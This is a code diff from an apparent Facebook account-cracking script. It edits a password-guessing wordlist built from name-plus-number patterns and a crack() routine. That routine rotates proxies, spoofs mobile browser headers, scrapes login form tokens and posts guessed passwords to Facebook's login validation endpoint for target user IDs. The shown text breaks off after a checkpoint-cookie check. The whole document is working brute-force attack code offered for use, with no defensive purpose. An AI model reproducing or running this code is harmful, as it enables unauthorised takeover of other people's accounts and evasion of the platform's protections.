@@ -339,42 +339,12 @@ def passwrd():
 					pwv.append(frs+'2004')
 					pwv.append(frs+'2003')
 					pwv.append(frs+'2002')
-					pwv.append(frs+'2001')
-					pwv.append(frs+'2000')
-					pwv.append(frs+'1122')
 					pwv.append(frs+'12')
 					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456')
-					pwv.append(frs+'1234567')
-					pwv.append(frs+'12345678')
-					pwv.append(frs+'123456789')
-					pwv.append(frs+'1234567890')
-					pwv.append('12'+frs)
-					pwv.append('123'+frs)
-					pwv.append('1234'+frs)
-					pwv.append('12345'+frs)
-					pwv.append('123456'+frs)
-					pwv.append('1234567'+frs)
-					pwv.append('12345678'+frs)
-					pwv.append('123456789'+frs)
-					pwv.append('1234567890'+frs)
-					pwv.append(frs+'1212')
-					pwv.append(frs+'1111')
-					pwv.append(frs+'0000')
-					pwv.append(frs+'112233')
-					pwv.append(frs+'11223344')
-					pwv.append(frs+'1122334455')
-					pwv.append('123'+frs+'123')
-					pwv.append('12'+frs+'12')
-					pwv.append('1234'+frs+'1234')
-					pwv.append('12345'+frs+'12345')
-					pwv.append(frs+'1997')
-					pwv.append(frs+'1998')
-					pwv.append(frs+'1999')
-					pwv.append(frs+'1996')
-					pwv.append(frs+'1995')
+					
 					
 			else:
 				if len(frs)<3:
@@ -389,42 +359,11 @@ def passwrd():
 					pwv.append(frs+'2004')
 					pwv.append(frs+'2003')
 					pwv.append(frs+'2002')
-					pwv.append(frs+'2001')
-					pwv.append(frs+'2000')
-					pwv.append(frs+'1122')
 					pwv.append(frs+'12')
 					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(frs+'123456')
-					pwv.append(frs+'1234567')
-					pwv.append(frs+'12345678')
-					pwv.append(frs+'123456789')
-					pwv.append(frs+'1234567890')
-					pwv.append('12'+frs)
-					pwv.append('123'+frs)
-					pwv.append('1234'+frs)
-					pwv.append('12345'+frs)
-					pwv.append('123456'+frs)
-					pwv.append('1234567'+frs)
-					pwv.append('12345678'+frs)
-					pwv.append('123456789'+frs)
-					pwv.append('1234567890'+frs)
-					pwv.append(frs+'1212')
-					pwv.append(frs+'1111')
-					pwv.append(frs+'0000')
-					pwv.append(frs+'112233')
-					pwv.append(frs+'11223344')
-					pwv.append(frs+'1122334455')
-					pwv.append('123'+frs+'123')
-					pwv.append('12'+frs+'12')
-					pwv.append('1234'+frs+'1234')
-					pwv.append('12345'+frs+'12345')
-					pwv.append(frs+'1997')
-					pwv.append(frs+'1998')
-					pwv.append(frs+'1999')
-					pwv.append(frs+'1996')
-					pwv.append(frs+'1995')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
@@ -457,12 +396,52 @@ def crack(idf,pwv):
         try:
             nip=random.choice(prox)
             proxs= {'http': 'prox://'+nip}
-            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
-            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-            koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+            ses.headers.update({'authority': 'p.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'raferer': 'https://p.facebook.com/',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua2,
+    'viewport-width': '980',
+})
+			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'raferer': 'https://p.facebook.com/',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua2,
+    'viewport-width': '980',
+}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'''\n\x1b[1;93m┏ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ᯽ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ┓
